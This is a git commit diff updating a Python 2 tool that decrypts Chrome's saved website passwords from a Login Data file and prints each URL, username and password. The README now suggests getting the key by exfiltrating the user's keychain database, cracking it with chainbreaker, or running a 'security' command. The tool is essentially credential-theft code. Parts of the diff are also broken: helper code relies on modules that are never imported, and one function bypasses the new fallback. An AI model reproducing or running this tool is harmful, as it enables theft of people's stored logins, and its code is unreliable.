07289d70c855e326ade3436eaca361c47dfa8195
maxdelacey <mdl13@protonmail.com>
2022-07-26 18:01:37 +0100

    Fixes

--- ChromePasswords.py
+++ ChromePasswords.py
@@ -1,24 +1,75 @@
-import sqlite3, os, binascii, subprocess, base64, sys, hashlib, glob
- 
-loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Profile*/Login Data" % os.path.expanduser("~"))
-if len(loginData) == 0:
-    loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Default/Login Data" % os.path.expanduser("~")) #attempt default profile
-safeStorageKey = subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True).replace("\n", "").replace("\"", "")
-if safeStorageKey == "":
-    print "ERROR getting Chrome Safe Storage Key"
-    sys.exit()
+#!/usr/bin/env python2
 
-def chromeDecrypt(encrypted_value, iv, key=None): #AES decryption using the PBKDF2 key and 16x ' ' IV, via openSSL (installed on OSX natively)
-    hexKey = binascii.hexlify(key)
-    hexEncPassword = base64.b64encode(encrypted_value[3:])
-    try: #send any error messages to /dev/null to prevent screen bloating up
-        decrypted = subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hexKey, hexEncPassword), shell=True)
-    except Exception as e:
-        decrypted = "ERROR retrieving password"
+import sqlite3
+import os
+import binascii
+import subprocess
+import base64
+import sys
+import hashlib
+import glob
+import argparse
+
+parser = argparse.ArgumentParser() 
+required = parser.add_argument_group('required arguments')
+required.add_argument("-p", "--safe-storage-password", required=True, dest="password")
+required.add_argument("-i", "--login-data-filepath", required=True, dest="login_data")
+#parser.add_argument("-o", "--output-file", default="decrypted-out.txt")
+args = parser.parse_args()
+
+
+# Required variables
+loginData = glob.glob(args.login_data)
+safeStorageKey = args.password
+
+
+def pbkdf2_bin(password, salt, iterations, keylen=16):
+    _pack_int = struct.Struct('>I').pack
+    hashfunc = sha1
+    mac = hmac.new(password, None, hashfunc)
+
+    def _pseudorandom(x, mac=mac):
+        h = mac.copy()
+        h.update(x)
+        return map(ord, h.digest())
+
+    buf = []
+    for block in xrange(1, -(-keylen // mac.digest_size) + 1):
+        rv = u = _pseudorandom(salt + _pack_int(block))
+        for i in xrange(iterations - 1):
+            u = _pseudorandom(''.join(map(chr, u)))
+            rv = itertools.starmap(operator.xor, itertools.izip(rv, u))
+        buf.extend(rv)
+    return ''.join(map(chr, buf))[:keylen]
+
+
+try:
+    from hashlib import pbkdf2_hmac
+except ImportError:
+    # If hashlib import is not available (Python <2.7.8, macOS < 10.11) use @mitsuhiko's pbkdf2 method above
+    pbkdf2_hmac = pbkdf2_bin
+    from hashlib import sha1
+
+
+def chromeDecrypt(encrypted, safeStorageKey):
+    #For Chrome default IV is 16 spaces and the salt is 'saltysalt'. For Mac, default iteration is 1003, for Linux it's 1.
+    iv = ''.join(('20', ) * 16)
+    key = pbkdf2_hmac('sha1', safeStorageKey, b'saltysalt', 1003)[:16]
+    hex_key = binascii.hexlify(key)
+    hex_enc_password = base64.b64encode(encrypted[3:])
+    print("[+] Starting deryption routine...")
+    try:
+        decrypted = subprocess.check_output(
+            "echo {} | openssl enc -base64 -d "
+            "-aes-128-cbc -iv '{}' -K {}".format(hex_enc_password, iv, hex_key),
+            shell=True)
+    except subprocess.CalledProcessError:
+        decrypted = "Error decrypting this data"
     return decrypted
 
+
 def chromeProcess(safeStorageKey, loginData):
-    iv = ''.join(('20',) * 16) #salt, iterations, iv, size - https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
+    iv = ''.join(('20',) * 16)
     key = hashlib.pbkdf2_hmac('sha1', safeStorageKey, b'saltysalt', 1003)[:16]
     fd = os.open(loginData, os.O_RDONLY) #open as read only
     database = sqlite3.connect('/dev/fd/%d' % fd)
@@ -30,10 +81,12 @@ def chromeProcess(safeStorageKey, loginData):
             if user == "" or (encryptedPass[:3] != b'v10'): #user will be empty if they have selected "never" store password
                 continue
             else:
-                urlUserPassDecrypted = (url.encode('ascii', 'ignore'), user.encode('ascii', 'ignore'), chromeDecrypt(encryptedPass, iv, key=key).encode('ascii', 'ignore'))
+                urlUserPassDecrypted = (url.encode('ascii', 'ignore'), user.encode('ascii', 'ignore'), chromeDecrypt(encryptedPass, safeStorageKey).encode('ascii', 'ignore'))
                 decryptedList.append(urlUserPassDecrypted)
     return decryptedList
 
+#output = []
 for profile in loginData:
     for i, x in enumerate(chromeProcess(safeStorageKey, "%s" % profile)):
     	print "%s[%s]%s %s%s%s\n\t%sUser%s: %s\n\t%sPass%s: %s" % ("\033[32m", (i + 1), "\033[0m", "\033[1m", x[0], "\033[0m", "\033[32m", "\033[0m", x[1], "\033[32m", "\033[0m", x[2])
+
--- README.md
+++ README.md
@@ -1,38 +1,30 @@
 # OSXChromeDecrypt
-Decrypt Google Chrome and Chromium Passwords on Mac OS X. No dependencies, quick, fast.
+Decrypt Google Chrome and Chromium Passwords offline.
+
+Must be run on Linux or MacOS.
 
 These are the passwords saved via the "Would you like to remember this password" popup when you login to a website.
 
 Great for if you want to export all of your passwords with one command, as oppposed to manually selecting each one through Chrome's UI.
 
-Also great for forensic analysis, as you can obtain the safe storage key through a variety of methods.
+You can obtain the safe storage key through a variety of methods. One method is to exfiltrate the users keychain database, usually located in ```~/Library/keychains/login.keychain-db```
 
-# Information
+Once you have the keychain, it can be decrypted with https://github.com/gaddie-3/chainbreaker as long as you know the credentials for the user to which the keychain belongs.
 
-1. Look for any encrypted password data stored in ```~/Library/Application Support/Google/Chrome/Profiles */Login Data``` 
-2. Get the decryption key from the keychain WITHOUT having to confirm the users password!
-3. Use this key to decrypt the passwords.
-4. Print out all of the passwords in a user friendly format.
-  
-# Example usage: 
+Alternatively, you can run the below command on MacOS to retrieve the Chrome Safe Storage key:
 
-```python ChromePasswords.py``` 
+```security find-generic-password -ga Chrome```
 
-Then confirm keychain access by clicking "allow"
+## Usage: 
 
 ```
-OUTPUT:
+usage: ChromePasswords.py [-h] -p PASSWORD -i LOGIN_DATA
 
-[1] https://xxxxxxxx.yyyyyyy.zzzzzzz/login.php
+optional arguments:
+  -h, --help            show this help message and exit
 
-	User: bobloblaw
-  
-	Pass: supersecretpassword
-  
-[2] https://timcook.apple.com/apple-login
-
-	User: tim
-  
-	Pass: cook1010101
-  
+required arguments:
+  -p PASSWORD, --safe-storage-password PASSWORD
+  -i LOGIN_DATA, --login-data-filepath LOGIN_DATA
+ 
 ```
